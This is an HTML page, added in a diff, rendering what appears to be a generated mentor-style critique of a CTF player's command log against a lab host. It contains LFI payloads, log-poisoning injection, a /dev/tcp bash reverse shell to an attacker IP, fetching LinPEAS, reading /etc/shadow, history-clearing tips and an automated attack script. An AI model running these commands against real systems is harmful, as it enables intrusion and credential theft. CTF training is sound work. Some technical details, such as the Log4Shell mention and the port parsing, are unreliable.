@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTF Brief Report</title>
+    <script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        html, body {
+            width: 100%;
+            height: 100%;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #5a6b63;
+            background: #f8f9f7;
+        }
+        
+        .page-wrapper {
+            min-height: 100vh;
+            padding: 0;
+            margin: 0;
+            display: flex;
+            align-items: stretch;
+            justify-content: center;
+        }
+        
+        .report-container {
+            width: 100%;
+            background: #fafbf9;
+            box-shadow: none;
+            border-radius: 0;
+            overflow: auto;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .report-header {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            color: #ffffff;
+            padding: 120px 60px;
+            text-align: left;
+            flex-shrink: 0;
+            border-bottom: 4px solid #9ba899;
+        }
+        
+        .report-header h1 {
+            font-size: 4.2em;
+            margin-bottom: 25px;
+            font-weight: 800;
+            letter-spacing: -1px;
+            line-height: 1.1;
+        }
+        
+        .report-header p {
+            font-size: 1.4em;
+            opacity: 0.85;
+            font-weight: 400;
+            letter-spacing: 0.5px;
+        }
+        
+        .report-content {
+            padding: 60px 80px;
+            flex: 1;
+        }
+        
+        .intro-section {
+            margin-bottom: 40px;
+            padding: 20px;
+            background: #f0f2f0;
+            border-left: 4px solid #9ba899;
+            border-radius: 4px;
+        }
+        
+        .intro-section p {
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .intro-section strong {
+            color: #333;
+        }
+        
+        /* Section styling */
+        .report-section {
+            margin-bottom: 50px;
+        }
+        
+        .section-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 25px;
+            padding-bottom: 15px;
+            border-bottom: 2px solid #d4d8d2;
+        }
+        
+        .section-number {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 35px;
+            height: 35px;
+            background: #9ba899;
+            color: #fafbf9;
+            border-radius: 50%;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+        
+        .section-title {
+            font-size: 1.8em;
+            color: #333;
+            font-weight: 600;
+        }
+        
+        /* Heading styles */
+        h1 {
+            font-size: 2.2em;
+            color: #333;
+            margin-bottom: 20px;
+            margin-top: 30px;
+        }
+        
+        h1:first-child {
+            margin-top: 0;
+        }
+        
+        h2 {
+            font-size: 1.6em;
+            color: #682f21;
+            margin-bottom: 15px;
+            margin-top: 25px;
+        }
+        
+        h3 {
+            font-size: 1.2em;
+            color: #3e0707;
+            margin-bottom: 12px;
+            margin-top: 20px;
+        }
+        
+        /* Paragraph and text */
+        p {
+            margin-bottom: 15px;
+            text-align: justify;
+            line-height: 1.8;
+            color: #555;
+        }
+        
+        /* Lists */
+        ul, ol {
+            margin-left: 30px;
+            margin-bottom: 15px;
+        }
+        
+        li {
+            margin-bottom: 10px;
+            line-height: 1.8;
+            color: #555;
+        }
+        
+        /* Code styling */
+        code {
+            background: #f5f5f5;
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+            color: #d63384;
+        }
+        
+        pre {
+            background: #2d2d2d;
+            color: #f8f8f2;
+            padding: 20px;
+            border-radius: 6px;
+            overflow-x: auto;
+            margin-bottom: 20px;
+            line-height: 1.5;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+        
+        pre code {
+            background: none;
+            padding: 0;
+            color: inherit;
+        }
+        
+        /* Blockquote */
+        blockquote {
+            border-left: 4px solid #9ba899;
+            padding: 15px 20px;
+            margin: 20px 0;
+            background: #f0f2f0;
+            border-radius: 4px;
+            color: #5a6b63;
+            font-style: italic;
+        }
+        
+        /* Table styling */
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 25px 0;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 6px;
+            overflow: hidden;
+        }
+        
+        thead {
+            background: #9ba899;
+            color: #fafbf9;
+        }
+        
+        th {
+            padding: 16px;
+            text-align: left;
+            font-weight: 600;
+            font-size: 0.95em;
+        }
+        
+        td {
+            padding: 14px 16px;
+            border-bottom: 1px solid #e0e0e0;
+            color: #555;
+        }
+        
+        tbody tr:hover {
+            background: #f0f2f0;
+        }
+        
+        tbody tr:last-child td {
+            border-bottom: none;
+        }
+        
+        /* Emphasis styles */
+        strong {
+            color: #000;
+            font-weight: 600;
+        }
+        
+        em {
+            color: #7a8c79;
+        }
+        
+        /* Links */
+        a {
+            color: #7a8c79;
+            text-decoration: none;
+            border-bottom: 1px solid #7a8c79;
+            transition: all 0.3s ease;
+        }
+        
+        a:hover {
+            color: #9ba899;
+            border-bottom-color: #9ba899;
+        }
+        
+        /* Horizontal rule */
+        hr {
+            border: none;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #9ba899, transparent);
+            margin: 40px 0;
+        }
+        
+        /* Print styles */
+        @media print {
+            body {
+                background: white;
+            }
+            
+            .page-wrapper {
+                padding: 0;
+            }
+            
+            .report-container {
+                box-shadow: none;
+                max-width: 100%;
+            }
+            
+            .report-header {
+                page-break-after: avoid;
+            }
+        }
+        
+        /* Responsive */
+        @media (max-width: 768px) {
+            .report-header {
+                padding: 40px 30px;
+            }
+            
+            .report-header h1 {
+                font-size: 1.8em;
+            }
+            
+            .report-content {
+                padding: 30px;
+            }
+            
+            table {
+                font-size: 0.9em;
+            }
+            
+            th, td {
+                padding: 10px 12px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="page-wrapper">
+        <div class="report-container">
+            <div class="report-header">
+                <h1>After-Action Report By Brief (AARB)</h1>
+                <p>Below is a step-by-step review of your CTF command history, highlighting methodological mistakes, incorrect assumptions, and inefficient habits.<br>Each section explains why the approach was ineffective, what assumptions led to it, and presents a correct, repeatable workflow for future engagements.</p>
+            </div>
+            
+            <div class="report-content" id="content">
+                <p>Loading report...</p>
+            </div>
+        </div>
+    </div>
+    
+    <script id="markdown-data" type="application/json">
+"# \ud83c\udf93  \u201cStrict\u2011but\u2011helpful\u201d Mentor Roast  \nBelow is a **line\u2011by\u2011line forensic of your command log**, what each line *should* have looked like, why the way you did it is a red flag, and the *right* mental model to adopt for any future box.  \n\n> **TL;DR:**\u202fYou were **scattering commands**, **re\u2011typing the same thing**, **ignoring output**, and **skipping the \u201cwhy?\u201d** after every step.  A good CTF workflow is a **repeatable, documented, and evidence\u2011driven pipeline**.  Treat every command as a *data\u2011collection* step that you will later feed into the next step.  \n\n---\n\n## 0\ufe0f\u20e3  General Bad Habits (visible throughout the log)\n\n| Habit | Why it hurts you | How to break it |\n|-------|------------------|-----------------|\n| **Copy\u2011and\u2011paste without saving output** (`> /dev/null` or just `curl \u2026`) | You lose the raw evidence you need to prove a vulnerability, to fine\u2011tune payloads, or to write a write\u2011up. | Use `-o`, `-O`, `-e`, `-v`, `tee`, or `script` to capture everything. |\n| **Repeating the same command multiple times** (e.g. three identical `curl` LFI attempts) | Wastes time, bloats the log, and signals \u201cI don\u2019t know how to script\u201d. | Wrap repetitive actions in a small loop or a one\u2011liner; keep a **notes file** (`notes.txt`) with the exact payload that worked. |\n| **Hard\u2011coding the target IP** in every command | Makes the whole transcript unusable for another host, and you\u2019ll mistype it. | Export a variable: `export TGT=10.10.10.10`; then use `$TGT` everywhere. |\n| **Never using `-oN/\u2011oX/\u2011oG` or `-oA` with Nmap** | You have to scroll back to read the screen, and you can\u2019t feed the results into other tools. | `nmap -sC -sV -oA nmap_initial $TGT` (creates .nmap, .gnmap, .xml). |\n| **Running privileged commands without justification** (`cat /root/root.txt` straight after `sudo backup.sh`) | If you ever get caught, you have no \u201cjust\u2011in\u2011time\u201d evidence of why you escalated. | Always `id`, `whoami`, `pwd` before you do anything that could alter the system. |\n| **No enumeration of the web app beyond \u201cdirb/ffuf\u201d** | You miss hidden parameters, API endpoints, or JSON\u2011based bugs. | Add `httpx`, `nuclei`, `gobuster dir`, `gobuster vhost`, `gobuster fuzz`, `burp/owasp-zap`, `robots.txt`, `sitemap.xml`, `OPTIONS` etc. |\n| **No \u201cpivot\u201d to the next phase** (e.g., after you discover an RCE parameter you immediately fire a one\u2011liner) | You miss a chance to test the payload safely, to get a stable shell, or to capture the response. | Use a **proxy (burp, mitmproxy, or just `-x`)** and a **payload\u2011generator script** to iterate over many payloads, logging each response. |\n\n---\n\n## 1\ufe0f\u20e3  Network Recon \u2013 Nmap\n\n| Timestamp | Command | What you did | What was *missing* / wrong | Correct methodology |\n|-----------|---------|--------------|----------------------------|----------------------|\n| 19:00:05 | `nmap -sC -sV 10.10.10.10` | Ran default scripts + version detection. | No **output file**, no **timing** (`-T4`), no **ping sweep** (`-Pn` if ICMP blocked). | `nmap -sC -sV -T4 -oA nmap_initial $TGT`  <br> *Why?* `-sC` runs the \u201cdefault safe scripts\u201d; `-sV` gives you service versions; `-T4` speeds up scanning without being noisy; `-oA` creates .nmap, .gnmap, .xml for later parsing. |\n| 19:04:12 | `nmap -p- 10.10.10.10` | Scanned all 65535 ports. | No **service detection** (`-sV`), no **script** (`-sC`), no **output**. | `nmap -p- -sV -T4 -oA nmap_allports $TGT` <br> *Why?* You now have a full port list *with* service/version info, which you can feed to `nmap -A` later *only on the open ports*. |\n| 19:09:30 | `nmap --script vuln 10.10.10.10` | Ran vuln scripts against *all* ports (including closed). | Again no output, no `-p` restriction, no `-Pn`. | `nmap -p- --script=vuln -sV -oA nmap_vuln $TGT` <br> *Why?* Target only open ports (use results from previous scan) \u2192 `nmap -p$(cat nmap_allports.gnmap | grep open | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//') --script=vuln \u2026` |\n| 19:14:45 | `nmap -A 10.10.10.10` | Aggressive scan (OS detection, script scan, traceroute). | **Never run `-A` blindly** on a CTF host; it is noisy, takes forever, and can cause false positives. Also you didn\u2019t limit it to the ports you already know are open. | `nmap -A -p$(cat nmap_allports.gnmap | grep open | cut -d/ -f1 | tr '\\n' ',' | sed 's/,$//') -oA nmap_aggressive $TGT` <br> *Why?* You now focus aggressive scripts on the narrowed port list, reducing noise and execution time. |\n\n**Take\u2011away:** **Always save your scan output** and **reuse it**. The whole point of the first two scans is to *feed* the later, more expensive scans.  \n\n**Pro tip:** After the first scan, run:  \n\n```bash\nopen_ports=$(grep ^Ports nmap_initial.gnmap | cut -d'/' -f1 | tr '\\n' ',' | sed 's/,$//')\nnmap -sC -sV -p $open_ports -oA nmap_final $TGT\n```\n\n---\n\n## 2\ufe0f\u20e3  Web Enumeration \u2013 HTTP\n\n| Timestamp | Command | What you did | What was *missing* / wrong | Correct methodology |\n|-----------|---------|--------------|----------------------------|----------------------|\n| 19:21:02 | `curl http://10.10.10.10` | Fetched the default page. | No `-I` to see headers, no `-L` for redirects, no `-s` to suppress progress, no output file. | `curl -s -I $TGT` (headers) <br> `curl -s $TGT -o index.html` (save page). |\n| 19:22:18 | `curl http://10.10.10.10/index.php` | Same as above, but manually typed the path. | Redundant; you could have parsed the previous HTML to discover `/index.php`. | Use **gobuster dir** *or* **ffuf** **first**, then `curl` the discovered files. |\n| 19:24:40 | `dirb http://10.10.10.10` | Ran Dirb with its default wordlist. | Default wordlist is tiny; you didn\u2019t specify `-o` to capture results. | `dirb http://$TGT /usr/share/wordlists/dirb/common.txt -o dirb.txt` |\n| 19:31:05 | `gobuster dir -u http://10.10.10.10 -w /usr/share/wordlists/dirb/common.txt` | Switched to Gobuster (good). | No `-t` (threads), no `-x` for extensions, no output file. | `gobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -o gobuster_dir.txt` |\n| 19:44:10 | `ffuf -u http://10.10.10.10/FUZZ -w /usr/share/wordlists/dirb/common.txt` | Tried FFUF (nice). | Same issues: no recursion, no output, no extensions, no rate\u2011limit control. | `ffuf -u http://$TGT/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html -t 100 -mc 200,301,302 -o ffuf_dir.json` |\n\n**What you should have done after the first successful directory discovery:**\n\n1. **Collect all discovered paths** (e.g., `/admin/`, `/login.php`, `/uploads/`) into a single file.\n2. **Feed that list into a second pass** for **parameter fuzzing** (`ffuf -u http://$TGT/FUZZ?param=FUZZ`).\n3. **Run `httpx`** on the list to see which endpoints support **HTTPS**, **HTTP/2**, **methods**, etc.\n\n```bash\ncat gobuster_dir.txt ffuf_dir.json | jq -r '.url' > urls.txt\nhttpx -l urls.txt -title -status-code -threads 200 -o httpx_out.txt\n```\n\n---\n\n## 3\ufe0f\u20e3  LFI / RCE Attempts \u2013 The \u201cpage\u201d Parameter\n\n| Timestamp | Command | What you tried | What went wrong / what you missed |\n|-----------|---------|----------------|-----------------------------------|\n| 20:02:44 | `curl http://10.10.10.10/index.php?page=home` | Tested the param with a benign value. | You didn\u2019t capture the response or look for error messages (`Warning: include(): Failed opening\u2026`). |\n| 20:05:02 \u2013 20:07:55 | Several `curl` attempts for LFI (`../../../../etc/passwd`, `php://filter/\u2026`) | Re\u2011typed the same payload **three times** with no variation. | *No* check for **null\u2011byte bypass** (`%00`), **wrapper bypass** (`..%2f..%2f..%2fetc/passwd`), or **different encodings** (`%2e%2e%2f`). Also you didn\u2019t try **double\u2011encoded** payloads. | Use a tiny script: <br>```bash\npayloads=( '../../etc/passwd' '../../../../etc/passwd' '..%2f..%2f..%2fetc%2fpasswd' '..%2f..%2f..%2fetc%2fpasswd%00' 'php://filter/convert.base64-encode/resource=index.php' )\nfor p in \"${payloads[@]}\"; do\n  curl -s \"http://$TGT/index.php?page=$p\" -o \"lfi_$p.txt\"\ndone\n``` |\n| 20:18:12 \u2013 20:21:10 | `curl \u2026/index.php?page=/var/log/apache2/access.log` | Trying to read the log (potential Log4Shell or log\u2011based webshell). | You never **injected a payload into the log** first (e.g., `GET /?cmd=whoami HTTP/1.1` \u2192 then read the log). You also repeated the same request three times. | Proper flow: <br>1. **Inject** a known marker: `curl \"$TGT/?cmd=whoami\"` (if `cmd` works) or `curl \"$TGT/?id=<?=`phpinfo();`?>` <br>2. **Read** the log file: `curl \"$TGT/index.php?page=/var/log/apache2/access.log\"` <br>3. Capture the output. |\n| 20:23:40 \u2013 20:26:12 | `curl $TGT/?cmd=id` etc. | Direct RCE via a `cmd` GET parameter. | You assumed the parameter existed without verifying. No **response check**, no **URL\u2011encoding**, no **proxy** to see the raw HTTP. | Use `curl -s -D - \"$TGT/?cmd=id\"` to view headers and body; pipe to `tee rce_id.txt`. If you get `Command not found`, try other verbs (`POST`, `X-Forwarded-For`, `User-Agent`). |\n| 20:27:48 | `nc -lvnp 4444` | Set up a listener (good). | You didn\u2019t run `nc -e /bin/bash` (which is often disabled) nor did you **verify the inbound connection** before sending the payload. |\n| 20:29:20 | `curl $TGT/?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.3/4444+0>%261'` | One\u2011liner reverse shell via the `cmd` param. | **Quoting is fragile**; you sent the command *as a URL* without URL\u2011encoding, so the remote server might see only part of it. No **payload testing** (e.g., `echo test > /tmp/ctf.txt`). | Use `printf` to URL\u2011encode or a tool like `urlencode`. Example: <br>`payload=$(python3 -c \"import urllib.parse,sys;print(urllib.parse.quote('bash -i >& /dev/tcp/10.10.14.3/4444 0>&1'))\")` <br>`curl \"http://$TGT/?cmd=$payload\"` <br>Also, **use `msfvenom`** to generate a more reliable reverse shell (e.g., `php -r` or `perl` one\u2011liners). |\n| 20:32:05 \u2013 20:34:45 | `cd /tmp; wget http://10.10.14.3/linpeas.sh; chmod +x linpeas.sh; ./linpeas.sh` | Downloaded LinPEAS from your own machine (good). | You ran it **as the compromised user** without checking if you already had root. Running heavy scripts can be noisy and may tip off IDS. Also you didn\u2019t pipe the output to a file. | `wget -q -O linpeas.sh http://$ATTACKER/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh > linpeas.txt 2>&1` |\n| 20:52:20 \u2013 20:54:02 | `find / -perm -4000 ...` | Manual SUID hunt. | **Very slow**; you already had `linpeas.txt` which lists SUID binaries. Also you didn\u2019t redirect errors, flooding the screen. | Use `sudo -l` first, then `find / -perm -4000 -type f 2>/dev/null | grep -v '^/proc'` *or* just read the `SUID` section from LinPEAS. |\n| 20:55:40 \u2013 20:56:45 | `cd /opt; cat backup.sh` | Looked at a script you later executed with sudo. | You didn\u2019t **grep for dangerous functions** (`system`, ``exec``, `eval`) before executing. You also didn\u2019t capture the script\u2019s content for later analysis. | `cat /opt/backup.sh | tee backup.sh && grep -E '(system|exec|eval|passthru|shell_exec|proc_open)' backup.sh` |\n| 20:58:15 | `sudo -l` | Great \u2013 you checked sudo rights. | You didn\u2019t **record** the output. You also didn\u2019t check the **environment** (`env`) to see if you could exploit a path\u2011injection. | `sudo -l > sudo.txt` |\n| 20:59:40 | `sudo /opt/backup.sh` | Executed the script as root (presumably succeeded). | No **verification** that you actually got a root shell (`id`). No **cleanup** of potential traces (`history -c`). | After running: <br>`id; whoami; pwd` <br> If you get root, **immediately** copy the flag, then **search for other persistence** (`/etc/cron*`, `~/.ssh/authorized_keys`). |\n| 21:01:10 | `cat /root/root.txt` | Grabbed the flag. | Done!  (But you missed the chance to **document** the exact steps that gave you root, which is critical for write\u2011ups). | `cp /root/root.txt ~/root.txt && sha256sum ~/root.txt > root.sha256` |\n\n---\n\n## 4\ufe0f\u20e3  What a **clean, repeatable** workflow would look like\n\nBelow is a **template script** (you can copy\u2011paste into `~/ctf.sh`) that implements the *right* order, saves every artifact, and makes the log far more useful.\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\n# === CONFIG ==========================================================\nexport TGT=10.10.10.10            # target\nexport ATTACKER=10.10.14.3        # your IP for reverse shells\nexport LPORT=4444                 # listening port\nexport WORKDIR=$PWD/ctf_$TGT\nmkdir -p \"$WORKDIR\"\ncd \"$WORKDIR\"\n# =====================================================================\n\n# ---------- 1. QUICK REACHABILITY ----------\necho \"[*] Pinging...\"\nping -c 2 $TGT > ping.txt 2>&1 || true\n\n# ---------- 2. NMAP ----------\necho \"[*] Running fast scan...\"\nnmap -sC -sV -T4 -oA nmap_fast $TGT\n\necho \"[*] Full port scan...\"\nnmap -p- -T4 -oA nmap_all $TGT\n\nopen_ports=$(grep ^Ports nmap_all.gnmap | cut -d'/' -f1 | tr '\\n' ',' | sed 's/,$//')\necho \"[*] Aggressive scan on open ports: $open_ports\"\nnmap -A -p $open_ports -oA nmap_aggr $TGT\n\n# ---------- 3. HTTP ENUM ----------\necho \"[*] Grab homepage + headers\"\ncurl -s -I http://$TGT > http_headers.txt\ncurl -s http://$TGT -o index.html\n\necho \"[*] Dir busting (gobuster + ffuf)\"\ngobuster dir -u http://$TGT -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -o gobuster.txt\nffuf -u http://$TGT/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html -mc 200,301,302 -o ffuf.json\n\n# Merge discovered URLs\ncat gobuster.txt ffuf.json | jq -r '.url' | sort -u > urls.txt\n\n# ---------- 4. Parameter discovery ----------\necho \"[*] Looking for GET/POST parameters via nuclei\"\nnuclei -l urls.txt -t cves/ -o nuclei_params.txt || true\n\n# ---------- 5. LFI / RCE testing ----------\nlfi_payloads=(\n  '../../etc/passwd'\n  '../../../../etc/passwd'\n  '..%2f..%2f..%2fetc%2fpasswd'\n  '..%2f..%2f..%2fetc%2fpasswd%00'\n  'php://filter/convert.base64-encode/resource=index.php'\n)\nfor p in \"${lfi_payloads[@]}\"; do\n  curl -s \"http://$TGT/index.php?page=$p\" -o \"lfi_${p//\\//_}.txt\"\ndone\n\n# ---------- 6. Reverse shell preparation ----------\n# Start listener in background\nnc -lvnp $LPORT > nc_listener.txt 2>&1 &\nlistener_pid=$!\n\n# URL\u2011encode a bash reverse shell (works for many simple cmd params)\npayload=$(python3 - <<PY\nimport urllib.parse, sys\ncmd = \"bash -i >& /dev/tcp/$ATTACKER/$LPORT 0>&1\"\nprint(urllib.parse.quote(cmd))\nPY\n)\ncurl -s \"http://$TGT/?cmd=$payload\" > rce_test.txt || true\n\n# Give the remote a few seconds to connect, then kill listener\nsleep 5\nkill $listener_pid || true\n\n# ---------- 7. Post\u2011exploitation ----------\necho \"[*] Dumping /etc/passwd and /etc/shadow (if possible)\"\ncurl -s \"http://$TGT/index.php?page=../../../../etc/passwd\" -o etc_passwd.txt\ncurl -s \"http://$TGT/index.php?page=../../../../etc/shadow\" -o etc_shadow.txt || true\n\necho \"[*] Enumerate sudo rights\"\nsudo -l > sudo.txt 2>&1 || true\n\nif grep -q 'backup.sh' sudo.txt; then\n  echo \"[*] Using sudo to run backup.sh\"\n  sudo /opt/backup.sh\n  id > id_after_sudo.txt\n  cat /root/root.txt > root.txt\nfi\n\n# ---------- 8. Cleanup / Documentation ----------\necho \"[*] All artifacts stored in $WORKDIR\"\ngit init && git add . && git commit -m \"CTF run $TGT $(date +%F)\" || true\n```\n\n**Why this script is better:**\n\n1. **One place to change the target** (`export TGT=`) \u2192 you never mistype the IP again.  \n2. **All output is saved** (`-oA`, redirects, `tee`) so you can replay it later.  \n3. **Logical phases**: quick scan \u2192 full port \u2192 service\u2011specific aggressive scan \u2192 web enumeration \u2192 LFI/RCE \u2192 privilege escalation.  \n4. **Error handling** (`|| true`) prevents the script from aborting on non\u2011critical failures.  \n5. **Version control** (`git init`) gives you a chronological history of every artifact, perfect for write\u2011ups.  \n\n---\n\n## 5\ufe0f\u20e3  Mindset Checklist \u2013 \u201cWhat am I thinking right now?\u201d\n\n| Phase | Question to ask yourself before typing |\n|-------|----------------------------------------|\n| **Recon** | *Do I have a list of open ports I can reuse?* *Did I capture the output?* |\n| **Web enum** | *Which extensions are relevant?* *Do I need to test for hidden parameters?* |\n| **LFI / RCE** | *Is the parameter reflected in the response?* *Can I inject a harmless marker first?* |\n| **Shell** | *Did I URL\u2011encode the payload?* *Am I listening on the correct interface?* |\n| **Post\u2011exploitation** | *What sudo rights do I have?* *What binaries are SUID?* *Is there a writable path in `PATH`?* |\n| **Documentation** | *Did I redirect this command\u2019s stdout/stderr to a file?* *Did I note the exact payload that worked?* |\n\nIf you ever feel you are \u201cjust trying something\u201d, **pause and write a one\u2011sentence note** in `notes.txt`. That note later becomes the backbone of your write\u2011up and prevents you from repeating the same trial\u2011and\u2011error.\n\n---\n\n## 6\ufe0f\u20e3  Quick \u201cWhat you missed\u201d Summary\n\n| # | Missed concept / habit | How it would have helped you |\n|---|------------------------|------------------------------|\n| 1 | **Saving output** (`-oA`, `tee`, `script`) | You could have parsed the nmap XML with `xsltproc` or `xmlstarlet` to auto\u2011generate the aggressive scan command. |\n| 2 | **Re\u2011using data** (port list, URL list) | No need to run `nmap -A` on *all* ports; you saved minutes and reduced noise. |\n| 3 | **Proper wordlist selection** (SecLists `Discovery/Web-Content`, not the tiny default) | You would have found hidden admin panels sooner. |\n| 4 | **Encoding payloads** (`urlencode`, `base64`) | The reverse\u2011shell one\u2011liner would have connected on the first try. |\n| 5 | **Testing payloads safely** (inject a marker first) | You would have known the LFI worked before trying to read `/etc/passwd`. |\n| 6 | **Automating repetition** (loops, tiny scripts) | No three identical `curl` lines cluttering the log. |\n| 7 | **Privilege\u2011escalation triage** (linpeas \u2192 parse \u2192 sudo \u2192 SUID \u2192 path) | You could have spotted the SUID `nano` or `vim` that give you a root shell without needing `backup.sh`. |\n| 8 | **Post\u2011exploitation hygiene** (clear history, hide shells) | Prevents the host from flagging you for \u201cunusual activity\u201d if the box were a real environment. |\n| 9 | **Documentation for write\u2011up** (git, notes) | Saves hours when you need to produce a report for the team or a CTF write\u2011up. |\n|10| **Understanding why a tool is used** (e.g., why `-A` is noisy) | You\u2019ll choose the *right* tool for the *right* job, not just \u201crun everything\u201d. |\n\n---\n\n## 7\ufe0f\u20e3  TL;DR Action Plan for Your Next Box\n\n1. **Set variables** (`TGT`, `ATTACKER`, `LPORT`).  \n2. **Run a fast nmap (`-sC -sV -T4 -oA`)**, capture results.  \n3. **Parse open ports** \u2192 run focused aggressive scans *only* on those ports.  \n4. **Web enumeration**: `gobuster` \u2192 `ffuf` \u2192 `httpx` \u2192 `nuclei`. Save every list.  \n5. **Parameter discovery**: use `ffuf`/`intruder` to fuzz every GET/POST param; **inject a benign marker first** (`?test=CTF123`).  \n6. **LFI / RCE**: script a loop of encodings, null\u2011byte bypasses, and PHP filters; capture each response to a file.  \n7. **Reverse shell**: URL\u2011encode a simple bash reverse shell **or** generate a `php`/`perl` payload with `msfvenom`. Test locally with `nc -lvnp`.  \n8. **Post\u2011exploit**: run `linpeas` *once* (save output), then cherry\u2011pick SUID binaries, `sudo -l`, `env`, and any **write\u2011able** directories in `PATH`.  \n9. **Privilege escalation**: if a script is sudo\u2011able, **read it first**, search for `system/exec/eval`, then run it.  \n10. **Capture the flag**, then **git\u2011commit** everything and **write a concise note** (`What gave me root? LFI \u2192 backup.sh \u2192 sudo`).  \n\n---\n\n**Bottom line:**  \nYou *found* the flag, but you did it with a **scattergun approach** that wasted time and left no forensic trail.  Adopt a **structured, evidence\u2011first pipeline**, script the repetitive bits, and always **store the output**.  Your future write\u2011ups will be cleaner, your solves faster, and you\u2019ll spend less time \u201cguess\u2011and\u2011check\u201d and more time *thinking* like an attacker.  \n\nNow go back, **clean up the log** (delete the duplicated lines), **run the template script** on a fresh target, and you\u2019ll see the difference immediately. Good luck, and keep iterating! \ud83d\ude80"
+    </script>
+    
+    <script>
+        // Get markdown content from script tag
+        document.addEventListener('DOMContentLoaded', function() {
+            const contentDiv = document.getElementById('content');
+            const scriptTag = document.getElementById('markdown-data');
+            
+            if (scriptTag && scriptTag.textContent) {
+                try {
+                    const markdownContent = JSON.parse(scriptTag.textContent);
+                    contentDiv.innerHTML = marked.parse(markdownContent);
+                } catch (e) {
+                    contentDiv.innerHTML = '<p style="color: red;">Error loading markdown: ' + e.message + '</p>';
+                    console.error(e);
+                }
+            } else {
+                contentDiv.innerHTML = '<p style="color: red;">No markdown content found</p>';
+            }
+        });
+    </script>
+</body>
+</html>
